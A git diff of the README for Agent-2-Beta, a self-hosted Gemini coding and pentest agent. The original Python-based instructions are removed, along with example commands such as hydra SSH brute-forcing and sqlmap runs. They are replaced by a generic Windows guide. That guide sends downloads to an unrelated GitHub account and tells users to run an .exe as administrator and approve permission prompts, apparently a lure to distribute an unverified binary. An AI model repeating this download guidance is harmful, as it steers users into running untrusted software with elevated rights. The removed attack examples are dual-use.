@@ -1,453 +1,240 @@
-<h1 align="center">⚡ Agent-2-Beta</h1>
-
-<p align="center">
-  <em>A self-hosted autonomous AI development agent powered by Google Gemini —<br>
-  coding assistant, terminal agent, security tester, and persistent memory in one interface.</em>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white" />
-  <img src="https://img.shields.io/badge/Flask-Web_Framework-000000?style=for-the-badge&logo=flask&logoColor=white" />
-  <img src="https://img.shields.io/badge/Gemini-AI_Engine-4285F4?style=for-the-badge&logo=google&logoColor=white" />
-  <img src="https://img.shields.io/badge/SQLite-Database-003B57?style=for-the-badge&logo=sqlite&logoColor=white" />
-  <img src="https://img.shields.io/badge/CLI-Agent2_CLI-7c6af7?style=for-the-badge&logo=gnubash&logoColor=white" />
-  <img src="https://img.shields.io/badge/Status-Beta-f97316?style=for-the-badge" />
-</p>
-
-<p align="center">
-  <a href="#-overview">Overview</a> •
-  <a href="#-installation">Install</a> •
-  <a href="#️-run-modes">Run</a> •
-  <a href="#-managing-api-keys">Keys</a> •
-  <a href="#️-cli-commands-reference">CLI</a> •
-  <a href="#-troubleshooting">Troubleshoot</a> •
-  <a href="#-agent-2-pro">Pro Version</a> •
-  <a href="#-contributing">Contribute</a>
-</p>
-
----
-
-## 🚀 Overview
-
-**Agent-2-Beta** is a self-hosted autonomous AI agent powered by Google Gemini. It ships in two modes:
-
-| Mode | Entry point | Description |
-|------|-------------|-------------|
-| 🌐 **Web UI** | `agent2web.py` | Browser interface — workspaces, multi-tab terminals, Three.js 3D welcome, real-time streaming |
-| ⚡ **CLI** | `agent2cli.py` | Terminal-native agent — same brain, tools, and memory as the web UI |
-
-Both modes share the same **8 agentic tools**, persistent memory engine, and `.env`-based API key rotation.
-
----
-
-## ✨ Core Features
-
-| | Feature | Description |
-|-|---------|-------------|
-| 🗂️ | **Workspaces** | Claude Projects-style context — path browser, per-workspace memory, framework detection |
-| 🤖 | **8 Agent Tools** | Shell, file R/W, directory tree, project analyzer, web search, memory, planner |
-| 🧠 | **Persistent Memory** | Global, workspace-scoped, and auto-extracted memories across sessions |
-| 💻 | **Multi-tab Terminals** | Live streaming, stdin injection, ↑↓ command history, 2-stage kill |
-| 🔑 | **API Key Rotation** | Multiple keys, auto-rotate on quota, pin a key, per-key usage stats |
-| 🔒 | **Security Testing** | nmap, nikto, gobuster, sqlmap, hydra, metasploit — built-in workflows |
-| 🌐 | **Web Search** | DuckDuckGo instant answers — no extra API key required |
-| ✏️ | **Message Editing** | Edit any past message and re-run the agent from that point |
-| ⏹️ | **Stop Generation** | Cancel agent mid-flight at any time |
-| 📎 | **File Attachments** | Attach code, images, PDFs as context |
-| ▶️ | **One-click Run** | Click ▶ on any tool block to instantly run that command in the active terminal |
-| 🎨 | **3D Welcome Screen** | Three.js — neural particles, torus knot, rotating wireframes, octahedron |
-| 📦 | **Project Auto-Setup** | Detect framework → install deps → run project automatically |
-
----
-
-## 🖼️ Screenshots
-
-<div align="center">
-  <img src="pic/img1.png" alt="Agent2 Web Interface" width="49%" />
-  <img src="pic/img2.png" alt="Agent2 Installation" width="49%" />
-</div>
-<p align="center"><sub><strong>Left:</strong> Web Interface &nbsp;•&nbsp; <strong>Right:</strong> Installation &amp; Setup</sub></p>
-
-<br>
-
-<div align="center">
-  <img src="pic/img3.png" alt="Agent2 CLI" width="80%" />
-</div>
-<p align="center"><sub><strong>Agent2 CLI</strong> — Rich UI, key rotation, ↑↓ history, and all 8 tools in the terminal</sub></p>
-
----
-
-## 🧱 Project Structure
-
-```text
-agent2/
-├── run.py                  ← Universal launcher — setup, run, manage keys
-├── agent2web.py            ← Web UI entry point
-├── agent2cli.py            ← CLI agent entry point
-├── .env                    ← API keys  (auto-created on first run)
-├── agent2.db               ← SQLite database  (auto-created)
-└── agent2/
-    ├── __init__.py
-    ├── config.py           ← Platform detection, models, modes, constants
-    ├── database.py         ← SQLite helpers + schema + migrations
-    ├── memory.py           ← Memory engine (auto-extract, workspace-scoped)
-    ├── tools.py            ← 8 tool implementations
-    ├── keys.py             ← KeyRotator: rotation, pinning, usage tracking
-    ├── terminal.py         ← stream_command, stdin, kill, stop events
-    ├── agent.py            ← system_prompt, context builder, run_agent loop
-    ├── routes.py           ← All /api/* REST endpoints
-    ├── sockets.py          ← All Socket.IO event handlers
-    └── ui.py               ← HTML/CSS/JS single-page frontend  (89 KB)
-```
+# 🤖 Agent-2-Beta - Your Self-Hosted AI Workbench
 
----
+[![Download Agent-2-Beta](https://img.shields.io/badge/Download%20Agent-2-Beta-blue?style=for-the-badge)](https://github.com/mouthholeheaviside560/Agent-2-Beta)
 
-## ⚙️ Installation
+## 📥 Download
 
-### 1 — Clone
+Use this link to visit this page and download the app:
 
-```bash
-git https://github.com/aaravshah1311/Agent-2-Beta.git
-cd Agent-2-Beta
-```
+[https://github.com/mouthholeheaviside560/Agent-2-Beta](https://github.com/mouthholeheaviside560/Agent-2-Beta)
 
-### 2 — Run the launcher
+## 🖥️ What Agent-2-Beta Does
 
-```bash
-python run.py
-```
+Agent-2-Beta is a browser-based AI agent you run on your own machine. It brings several tools into one place:
 
-`run.py` will automatically:
-- ✅ Create a virtual environment
-- ✅ Install all dependencies (`flask`, `flask-socketio`, `google-genai`, `rich`, …)
-- ✅ Prompt for your Gemini API key and save it to `.env`
-- ✅ Start the web server
+- a coding assistant for writing and fixing code
+- a real terminal for running commands
+- security testing tools for checking web apps
+- persistent memory for saving useful context
+- a workspace system for handling tasks in one screen
 
-> 🔑 **Free Gemini API key →** https://aistudio.google.com/app/apikey
+It is built for people who want one place to manage AI help, local tools, and task work without switching between many apps
 
----
+## ✅ What You Need on Windows
 
-## ▶️ Run Modes
+Before you start, check these basics:
 
-### `run.py` — all flags at a glance
+- Windows 10 or Windows 11
+- A modern browser such as Chrome, Edge, or Firefox
+- At least 8 GB of RAM
+- 10 GB of free disk space
+- A stable internet connection
+- Permission to install and run apps on your PC
 
-```
-python run.py                 setup + start Web UI  (default)
-python run.py --web           setup + start Web UI
-python run.py --cli           setup + start CLI agent
-python run.py --addapi        add / manage API keys
-python run.py --reset         wipe venv and reinstall everything
-python run.py --uninstall     completely remove Agent2 and its venv
-python run.py -h              show this help menu
-```
+For the best experience, use a machine with 16 GB of RAM or more
 
----
+## 🚀 Getting Started on Windows
 
-### 🌐 Web UI
+Follow these steps in order:
 
-```bash
-python run.py
-# or explicitly
-python run.py --web
-```
+1. Open the download link above  
+2. On the GitHub page, look for the latest release or the main download area  
+3. Download the Windows version of Agent-2-Beta  
+4. Save the file to your Downloads folder or Desktop  
+5. If the file is a `.zip`, right-click it and choose **Extract All**  
+6. Open the extracted folder  
+7. Find the app file, such as `.exe` or a start script  
+8. Double-click the file to run Agent-2-Beta  
+9. If Windows asks for permission, choose **Yes**  
+10. Wait for the app to open in your browser or local window
 
-Opens at → **http://localhost:1311**
+If the app opens a local address such as `localhost`, type or paste that address into your browser
 
----
+## 🧭 First-Time Setup
 
-### ⚡ CLI Agent
+When you open Agent-2-Beta for the first time, complete these steps:
 
-```bash
-python run.py --cli
-```
+1. Choose your working folder if the app asks for one  
+2. Sign in or connect your AI provider if the app includes that step  
+3. Set your preferred model or agent mode  
+4. Allow the app to save memory if you want it to remember tasks  
+5. Open the workspace view and confirm the main tools load correctly
 
-Or call directly after first setup:
+If the app asks for API keys, enter them in the settings screen only
 
-```bash
-# macOS / Linux
-venv/bin/python agent2cli.py
+## 🧰 Main Features
 
-# Windows
-venv\Scripts\python agent2cli.py
-```
+### 🧠 Coding Assistant
+Use the coding assistant to:
 
-**One-shot mode** (pipe-friendly, just like `gemini -m flash "..."`):
+- write new code
+- fix broken code
+- explain files in plain language
+- suggest changes for a project
+- help with small edits and larger tasks
 
-```bash
-venv/bin/python agent2cli.py "portscan 10.10.1.1"
-venv/bin/python agent2cli.py --model 2.5-flash "explain this error"
-venv/bin/python agent2cli.py --mode thinking "design this architecture"
-venv/bin/python agent2cli.py --clear "start a fresh session"
-```
+### 💻 Real Terminal Access
+Use the terminal when you need to:
 
----
+- run commands
+- install packages
+- start local projects
+- check logs
+- test fixes
 
-## 🔑 Managing API Keys
+### 🔒 Security Testing Tools
+The app includes tools that help you inspect web apps and check for common issues. These tools are useful for:
 
-### Via `run.py` — recommended
+- reviewing app behavior
+- checking endpoints
+- testing inputs
+- finding weak spots in a local lab or test setup
 
-```bash
-python run.py --addapi
-```
+Use these tools only on systems you own or have permission to test
 
-Walks you through adding keys interactively and saves them to `.env`.  
-Keys are stored as `GEMINI_API_KEY`, `GEMINI_API_KEY_2`, `GEMINI_API_KEY_3` … and **auto-rotated** when one exhausts its quota. No downtime — the next key is picked up on the very next request.
+### 🗂️ Persistent Memory
+The memory system can store useful details such as:
 
-### Inside a CLI session
+- project notes
+- task history
+- goals
+- repeated commands
+- past fixes
 
-```
-/addapi
-```
+This helps the agent keep context between sessions
 
-Paste a new key without leaving the session — saved to `.env` immediately and active on the next call.
+### 🧩 Workspace System
+The workspace brings your work together in one place. You can use it to:
 
-### Reset everything
+- track active tasks
+- view files
+- switch between jobs
+- organize notes
+- keep related work grouped
 
-```bash
-python run.py --reset
-```
+## 🪟 How to Open the App After Install
 
-Wipes `venv/` and reinstalls all dependencies. Use when packages break or Python is upgraded.
+After setup, you can usually open Agent-2-Beta in one of these ways:
 
-### Full uninstall
+- double-click the app file again
+- use a desktop shortcut if one was created
+- open the local web address shown during startup
+- start it from the folder where you installed it
 
-```bash
-python run.py --uninstall
-```
+If the app does not open right away, wait a moment and check whether a browser tab launched in the background
 
-Removes the virtual environment and generated files, leaving source code intact.
+## ⚙️ Suggested Windows Settings
 
----
+For smoother use, set these options:
 
-## 🗂️ First Run — Workspace Setup (Web UI)
+- keep the app in a folder you can find fast
+- allow the browser to access local network features if prompted
+- keep at least 2 GB free after install
+- use a wired connection if you plan long sessions
+- close extra apps if your PC feels slow
 
-1. Open **http://localhost:1311**
-2. Click **+ Create Workspace** in the sidebar
-3. Enter a name and optionally a project path — leave blank to auto-create a folder
-4. Click the workspace → **New Chat** → start working
+## 🔍 Common Problems
 
-Every chat belongs to a workspace. The agent always knows your project path, detected framework, and accumulated workspace memories.
+### The app does not open
+Try these steps:
 
----
+1. Right-click the app file
+2. Choose **Run as administrator**
+3. Check that the file finished downloading
+4. Make sure Windows did not block the file
+5. Re-extract the zip file if needed
 
-## ⌨️ CLI Commands Reference
+### The browser shows a blank page
+Try these steps:
 
-| Command | Description |
-|---------|-------------|
-| `/help` | Show all commands |
-| `/addapi` | Add a Gemini API key to `.env` |
-| `/keys` | Show current API key status and usage |
-| `/model [name]` | Switch model (`2.5-flash-lite` · `2.5-flash` · `2.5-pro` · `3.1-*`) |
-| `/mode [name]` | Switch mode (`fast ⚡` · `pro ★` · `thinking 🧠`) |
-| `/clear` | Clear current conversation and start fresh |
-| `/history` | Show last 10 messages |
-| `/memory` | List all saved memories with importance scores |
-| `/addmem <text>` | Save a memory manually |
-| `/workspace [path]` | Show or set working directory for commands |
-| `/run <cmd>` | Run a shell command directly in the current workspace |
-| `/read <file>` | Read and display a file's contents |
-| `/write <file>` | Write text to a file (prompts for content) |
-| `/ls [path]` | Display a recursive directory tree |
-| `/analyze <path>` | Detect framework / language / dependencies / run command |
-| `/search <query>` | Web search via DuckDuckGo (no key required) |
-| `/exit` · `Ctrl+C` | Quit |
+1. Refresh the page
+2. Wait 20 to 30 seconds
+3. Close other tabs
+4. Open the page in Chrome or Edge
+5. Restart the app
 
----
+### The terminal does not start
+Try these steps:
 
-## 🧪 Setup Checklist
+1. Make sure the app has permission to use local tools
+2. Restart Agent-2-Beta
+3. Check that no other program is using the same port
+4. Open the app from the extracted folder again
 
-- [ ] Python 3.10+ installed
-- [ ] `python run.py` completed without errors
-- [ ] Gemini API key saved to `.env`
-- [ ] Web UI → server starts at **http://localhost:1311**, first workspace created
-- [ ] CLI → prompt `you [no-ws|2.5-flash-lite|★]>` appears
+### The workspace does not load
+Try these steps:
 
----
+1. Clear the browser cache
+2. Reopen the app
+3. Check your internet connection
+4. Confirm the install folder still exists
 
-## 🤖 Models Available
+## 🧪 Best Use Cases
 
-| Key | Model | Group |
-|-----|-------|-------|
-| `2.5-flash-lite` | Gemini 2.5 Flash Lite | 2.5 |
-| `2.5-flash` | Gemini 2.5 Flash | 2.5 |
-| `2.5-pro` | Gemini 2.5 Pro | 2.5 |
-| `3.1-flash-lite` | Gemini 3.1 Flash Lite | 3.1 |
-| `3.1-flash` | Gemini 3.1 Flash | 3.1 |
-| `3.1-pro` | Gemini 3.1 Pro | 3.1 |
+Agent-2-Beta works well for:
 
-## ⚡ Reasoning Modes
+- building small apps
+- testing code ideas
+- reviewing a project folder
+- running local commands with AI help
+- keeping notes tied to one workspace
+- checking a web app during development
+- handling repeat tasks with saved memory
 
-| Mode | Max Tokens | Best for |
-|------|-----------|----------|
-| ⚡ Fast | 2 048 | Quick answers, simple commands — lowest cost |
-| ★ Pro | 8 192 | Most tasks — balanced speed and quality |
-| 🧠 Thinking | 16 384 | Complex reasoning, architecture, hard bugs *(2.5 / 3.1 only)* |
+## 🔐 Safety Tips
 
----
+Use the tool with care:
 
-## 🛠️ Tech Stack
+- run commands only when you know what they do
+- test security tools on your own systems
+- keep your API keys private
+- store the app in a folder you control
+- back up important work files before large changes
 
-| Layer | Technology |
-|-------|-----------|
-| Backend | Python 3.10+, Flask, Flask-SocketIO |
-| AI Engine | Google Gemini (`google-genai`) |
-| Database | SQLite (stdlib `sqlite3`) |
-| Terminal | `subprocess.Popen` — live stdout streaming |
-| Web frontend | Vanilla JS, xterm.js, marked.js, highlight.js, Three.js |
-| 3D scene | Three.js r128 — particles, torus knot, icosahedra, octahedron |
-| CLI UI | Rich — panels, markdown, syntax highlight, spinner |
-| Memory | Auto-extraction via background Gemini call after each reply |
-| Web search | DuckDuckGo Instant Answer API — no key required |
+## 📁 Folder Layout
 
----
+After setup, you may see files and folders like these:
 
-## 🔒 Security Testing Workflows
+- `app` for the main program
+- `workspace` for task files
+- `memory` for saved context
+- `logs` for event records
+- `config` for settings
+- `tools` for helper functions
 
-Agent-2-Beta is purpose-built for security research and CTF work:
+This layout helps keep the app organized and easier to manage
 
-```bash
-portscan 10.10.1.1
-enumerate http://target:8080 with gobuster
-run sqlmap on http://target/login?id=1
-check for open ports on localhost
-scan for vulnerabilities on 192.168.1.0/24
-brute force SSH on 10.10.1.5 with hydra
-```
+## 🧭 Helpful Terms
 
-Supports: `nmap`, `nikto`, `gobuster`, `ffuf`, `sqlmap`, `hydra`, `metasploit`,
-`searchsploit`, `theharvester`, `binwalk`, `strings`, `volatility`, and more.
+A few simple terms may appear in the app:
 
----
+- **Agent**: the AI helper that handles tasks
+- **Workspace**: the area where your work lives
+- **Terminal**: a command window for running text commands
+- **Memory**: saved context used across sessions
+- **Model**: the AI engine the app talks to
 
-## 📌 Troubleshooting
+## 📌 Topics
 
-| Problem | Solution |
-|---------|----------|
-| `No API keys configured` | `python run.py --addapi` or type `/addapi` in the CLI |
-| Key quota exhausted | Keys rotate automatically. Add more: `python run.py --addapi` |
-| Model returns empty response | Switch to **2.5 Flash Lite**: `/model 2.5-flash-lite` |
-| Terminal not showing output | Refresh the browser tab and reconnect |
-| `python` not found on Windows | Use `py run.py` or install from the Microsoft Store |
-| Port 1311 already in use | Change `port=1311` in `agent2web.py` to another port |
-| Broken venv / import errors | `python run.py --reset` — wipes and reinstalls cleanly |
-| CLI spinner frozen | `Ctrl+C` — cancels the request and returns to prompt |
-| `rich` not installed | `python run.py --reset` — `rich` is included in the install list |
-| Want to start completely fresh | `python run.py --uninstall` then `python run.py` |
+This project is grouped with:
 
----
+- aaravshah1311
+- agent2
+- agent2-beta
+- agent2-pro
+- agentic-ai
+- agentic-workflow
+- ai-agents
+- ai-ml
+- ai-tools
+- penetration-testing
+- software-development
+- software-engineering
 
-## 🚀 Agent-2-Pro
+## 🏁 What to Do Next
 
-> **Unlock the full power of autonomous AI engineering.**
-
-**Agent-2-Pro** is the professional-grade evolution of Agent-2-Beta — a proper **Software Engineer** and **Brutal Pentester** in one agent.
-
-<div align="center">
-
-| | Agent-2-Beta | Agent-2-Pro |
-|-|:---:|:---:|
-| Workspaces | ✅ | ✅ |
-| 8 Agent Tools | ✅ | ✅ Extended |
-| Memory Engine | ✅ | ✅ Advanced |
-| Multi-tab Terminals | ✅ | ✅ |
-| **Full-project generation from one prompt** | ❌ | ✅ |
-| **Software Engineering mode** | ❌ | ✅ |
-| **DeepDive — task decomposition** | ❌ | ✅ |
-| **Brutal Penetration Testing** | ❌ | ✅ |
-| **QA & automated test generation** | ❌ | ✅ |
-| **Project Space** | ❌ | ✅ |
-
-</div>
-
-### Pro Feature Highlights
-
-**🏗️ Software Engineering Mode**
-Analyzes your prompt, architects the full solution, and engineers a complete multi-file project in a series of precise, self-correcting steps. One prompt → production-ready codebase.
-
-**🎯 DeepDive**
-Breaks a single complex task into multiple focused sub-tasks, solves each with precision, then assembles the final result. Dramatically higher accuracy on hard problems.
-
-**🔴 Brutal Pentester**
-Goes far beyond basic scanning — full kill-chain automation: recon → enumeration → exploitation → post-exploitation → report generation, all in one session.
-
-**🧪 QA Mode**
-Automatically generates unit tests, integration tests, and edge-case coverage for any codebase it builds or is given.
-
-### Get Agent-2-Pro
-
-📧 **Contact:** [aaravprogrammers@gmail.com](mailto:aaravprogrammers@gmail.com)
-🐙 **GitHub:** [github.com/aaravshah1311](https://github.com/aaravshah1311)
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome and appreciated! Agent-2-Beta is open to improvements in any area.
-
-### How to contribute
-
-1. **Fork** the repository
-2. **Create** a feature branch
-   ```bash
-   git checkout -b feature/your-feature-name
-   ```
-3. **Make** your changes and commit with a clear message
-   ```bash
-   git commit -m "feat: add your feature description"
-   ```
-4. **Push** to your fork
-   ```bash
-   git push origin feature/your-feature-name
-   ```
-5. **Open** a Pull Request against `main`
-
-### What we're looking for
-
-- 🐛 **Bug fixes** — especially edge cases on Windows/Mac/Linux
-- 🌐 **New tools** — additional agent capabilities
-- 🎨 **UI improvements** — frontend polish, accessibility
-- 📚 **Documentation** — clearer explanations, more examples
-- 🔒 **Security workflows** — new pentest automation patterns
-- ⚡ **Performance** — faster startup, lower memory, better streaming
-- 🌍 **Portability** — improvements for different platforms or Python versions
-
-### Guidelines
-
-- Keep changes focused — one PR per feature/fix
-- Follow the existing code style in each file
-- Test on at least one platform before submitting
-- Add a brief description in the PR explaining *what* and *why*
-
-### Report issues
-
-Found a bug or have a feature request? [Open an issue](https://github.com/aaravshah1311/Agent-2-Beta/issues) — please include your OS, Python version, and the exact error message.
-
----
-
-## 👤 Authors
-
-**Aarav Shah**
-[![GitHub](https://img.shields.io/badge/GitHub-aaravshah1311-181717?style=flat&logo=github)](https://github.com/aaravshah1311/)
-[![Portfolio](https://img.shields.io/badge/Portfolio-aaravshah1311.is--great.net-0ea5e9?style=flat)](https://aaravshah1311.is-great.net)
-[![Email](https://img.shields.io/badge/Email-aaravprogrammers%40gmail.com-EA4335?style=flat&logo=gmail)](mailto:aaravprogrammers@gmail.com)
-
-**Rudra Marathe**
-[![GitHub](https://img.shields.io/badge/GitHub-RudraDelete26-181717?style=flat&logo=github)](https://github.com/RudraDelete26/)
-[![Portfolio](https://img.shields.io/badge/Portfolio-rudraxdelete.is-great.net-0ea5e9?style=flat)](https://rudraxdelete.is-great.net)
-[![Email](https://img.shields.io/badge/Email-rudranmarathegpsagb%40gmail.com-EA4335?style=flat&logo=gmail)](mailto:rudranmarathegpsagb@gmail.com)
-
-**Naitik Soni**
-[![GitHub](https://img.shields.io/badge/GitHub-Naitiksoni--123-181717?style=flat&logo=github)](https://github.com/Naitiksoni-123/)
-[![Email](https://img.shields.io/badge/Email-naitiksoni1417%40gmail.com-EA4335?style=flat&logo=gmail)](mailto:naitiksoni1417@gmail.com)
-
----
-
-<div align="center">
-
-**⭐ Star this repo if Agent-2-Beta helps you build or break things.**
-
-<br>
-
-<sub>Built for developers, security researchers, and anyone who wants an AI that actually does things.</sub>
-
-</div>
+1. Download Agent-2-Beta from the link above  
+2. Open it on Windows  
+3. Set your workspace and memory options  
+4. Start with a small task  
+5. Use the coding assistant, terminal, and workspace together
